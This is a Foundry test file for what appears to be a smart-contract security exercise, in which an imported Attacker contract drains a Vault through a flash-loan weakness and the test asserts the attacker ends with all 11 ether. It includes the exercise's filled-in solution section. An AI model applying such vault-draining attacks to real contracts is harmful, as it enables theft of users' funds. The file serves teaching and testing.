// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/03-Flashloan.sol";
import {Attacker} from "../src/AttackerContract/FlashloanAttack.sol";

contract CallerTest is Test {
    Vault public vault;
    address user;

    function setUp() public {
        vault = new Vault();

        user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_Flashloan() public {
        address attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)
        Attacker attackerContract = new Attacker(address(vault));
        attackerContract.attack();
        attackerContract.withdraw();

        // END OF SOLUTION

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}
